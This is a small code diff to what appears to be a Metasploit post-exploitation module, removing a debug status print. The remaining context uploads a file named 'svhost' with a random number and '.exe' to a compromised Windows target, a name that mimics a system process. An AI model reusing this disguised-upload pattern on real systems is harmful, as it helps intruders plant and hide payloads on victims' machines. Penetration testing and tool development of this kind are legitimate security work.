@@ -132,8 +132,6 @@ class Metasploit4 < Msf::Post
     file_name  = "svhost#{rand(100)}.exe"
     file_on_target = "#{location}\\#{file_name}"
 
-    print_status("FILE ON TARGET #{file_on_target}")
-
     begin
       upload_file("#{file_on_target}","#{file}")
     rescue ::Rex::Post::Meterpreter::RequestError => e
